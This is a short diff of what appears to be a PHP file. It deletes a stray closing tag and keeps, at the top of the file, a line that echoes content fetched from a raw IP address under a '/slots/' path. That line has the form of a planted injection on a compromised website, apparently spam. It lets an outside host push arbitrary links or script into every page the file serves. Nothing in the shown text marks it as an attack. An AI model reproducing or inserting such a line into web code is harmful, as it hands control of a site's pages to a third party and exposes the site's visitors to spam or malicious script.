@@ -1,4 +1,3 @@
-?>
 <?php echo file_get_contents("http://156.67.221.29/slots/beloved.txt");?>
 <?php
 
